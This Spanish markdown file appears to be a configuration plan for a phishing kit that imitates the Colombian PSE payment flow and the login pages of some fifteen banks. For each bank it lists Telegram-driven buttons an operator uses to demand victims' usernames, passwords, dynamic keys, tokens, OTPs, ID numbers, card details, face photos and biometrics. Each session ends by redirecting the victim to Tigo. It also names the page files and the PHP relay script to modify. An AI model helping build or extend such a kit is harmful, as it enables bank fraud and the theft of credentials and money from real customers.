# Configuración de Botones por Banco - Sistema PSE

## ✅ BANCOLOMBIA
**Botones:**
- 🔑 Pedir Logo/Usuario
- 🔢 Pedir Dinámica
- 💳 Pedir Tarjeta
- 🆔 Pedir Cédula
- 📷 Pedir Cara
- 📄 Pedir Términos
- 🏁 Finalizar

**Archivos:** Bancolombia/index.html, cedula.html, tarjeta.html, dinamica.html, cara.html, terminos.html

---

## ✅ DAVIVIENDA
**Botones:**
- 🔐 Pedir Login
- 🔑 Pedir Clave
- 📱 Pedir Token
- ✅ Finalizar

**Archivos:** Davivienda/index.html, clave.html, token.html

---

## ✅ DAVIPLATA
**Botones:**
- 👤 Pedir Usuario
- 🔑 Pedir Clave/Contraseña
- 🔄 Pedir Dinámica
- 📲 Pedir OTP
- ✅ Finalizar

**Archivos:** Daviplata/index.html, clave.html, dinamica.html, otp.html

---

## ✅ BANCO DE BOGOTÁ
**Botones:**
- 🔑 Pedir Login
- 📱 Pedir Token
- ✅ Finalizar

**Archivos:** Bogota/index.html, token.html

---

## ✅ POPULAR
**Botones:**
- 🔐 Pedir Login
- 🔑 Pedir Clave
- 📱 Pedir Token
- 🔢 Pedir OTP
- ✅ Finalizar

**Archivos:** Popular/index.html, clave.html, token.html, otp.html

---

## ✅ OCCIDENTE
**Botones:**
- 🔐 Pedir Login
- 📱 Pedir Token
- 🔢 Pedir OTP
- ✅ Finalizar

**Archivos:** Occidente/index.html, token.html, otp.html

---

## ✅ BBVA
**Botones:**
- 🔐 Pedir Login (Usuario/Contraseña)
- 🔐 Pedir Token
- ✅ Finalizar

**Archivos:** BBVA/index.html, token.html

---

## ✅ AGRARIO
**Botones:**
- 🔄 Pedir Logo (Usuario)
- 🔐 Pedir Password/Contraseña
- 🔢 Pedir Dinámica
- 🔑 Pedir Token
- 📱 Pedir OTP
- ✅ Finalizar

**Archivos:** Agrario/index.html, password.html, dinamica.html, token.html, otp.html

---

## ✅ AV VILLAS
**Botones:**
- 🔐 Pedir Login (Usuario/Contraseña)
- 📲 Pedir OTP
- ✅ Finalizar

**Archivos:** AV-Villas/index.html, otp.html

---

## ✅ CAJA SOCIAL
**Botones:**
- 🔐 Pedir Login (Usuario)
- 🔑 Pedir Password/Contraseña
- 🔐 Pedir Token
- ✅ Finalizar

**Archivos:** Caja-Social/index.html, password.html, token.html

---

## ✅ FALABELLA
**Botones:**
- 🔐 Pedir Login (Cédula/Clave Internet)
- 🔢 Pedir Dinámica
- 📱 Pedir OTP
- ✅ Finalizar

**Archivos:** Falabella/index.html, dinamica.html, otp.html

---

## ✅ SERFINANZA
**Botones:**
- 🔄 Pedir Login/Usuario
- 🔑 Pedir Password/Contraseña
- 🔢 Pedir Dinámica
- 📱 Pedir OTP
- ✅ Finalizar

**Archivos:** Serfinanza/index.html, password.html, dinamica.html, otp.html

---

## ✅ BANCO MUNDO MUJER
**Botones:**
- 🔐 Pedir Login
- 🔑 Pedir Password/Contraseña
- 🔢 Pedir Dinámica
- 📱 Pedir OTP
- ✅ Finalizar

**Archivos:** Banco-Mundo-Mujer/index.html, password.html, dynamic.html, otp.html

---

## ✅ SCOTIABANK COLPATRIA
**Botones:**
- 🔐 Pedir Login
- 🔑 Pedir Clave/Contraseña
- 🔢 Pedir Dinámica (si tiene)
- ✅ Finalizar

**Archivos:** Scotiabank-Colpatria/ (verificar estructura)

---

## ✅ ITAU
**Botones:**
- 📧 Pedir Correo
- 🆔 Pedir Cédula
- 🔐 Pedir Clave
- 🔑 Pedir Token
- 📱 Pedir Biometría
- ✅ Finalizar

**Archivos:** Itau/correo.html, cedula.html, biometria.html, token.html, recuperar.html

---

## RESUMEN DE BOTONES COMUNES

### Botones que TODOS deben tener:
- ✅ **Finalizar** - Termina la sesión y redirige a Tigo

### Botones por tipo de autenticación:

**Login/Usuario:**
- Bancolombia: Pedir Logo
- Davivienda, Bogotá, Popular, Occidente, BBVA: Pedir Login
- Daviplata, Serfinanza: Pedir Usuario
- Agrario: Pedir Logo
- Falabella: Pedir Login (Cédula + Clave Internet)
- Itau: Pedir Correo + Pedir Cédula

**Contraseña/Clave:**
- Davivienda, Popular: Pedir Clave
- Daviplata, Agrario, Caja Social, Serfinanza, Mundo Mujer: Pedir Password/Contraseña
- Itau: Pedir Clave

**Segundo Factor:**
- Bancolombia, Daviplata, Falabella, Serfinanza, Mundo Mujer, Agrario: Pedir Dinámica
- Davivienda, Popular, BBVA, Caja Social, Itau: Pedir Token
- Bogotá, Popular, Occidente, Falabella, Daviplata, Serfinanza, AV Villas, Agrario, Mundo Mujer: Pedir OTP

**Especiales:**
- Bancolombia: Pedir Tarjeta, Pedir Cédula, Pedir Cara, Pedir Términos
- Itau: Pedir Biometría, Pedir Correo

---

## NOTAS IMPORTANTES:

1. Cada banco tiene su flujo específico de páginas
2. Los botones deben estar configurados en `telegram-send.php` en el case correspondiente
3. Los archivos JavaScript de cada banco escuchan las acciones de Telegram
4. Las acciones siguen el formato: `{banco}_{accion}` (ej: `bancolombia_request_dinamica`)
5. Para PSE, después de seleccionar el banco, se redirige a `/bancas/{BancoFolder}/index.html`

---

## ARCHIVO A MODIFICAR:
`php-app/public/api/telegram-send.php` - Agregar casos para cada banco con sus botones específicos
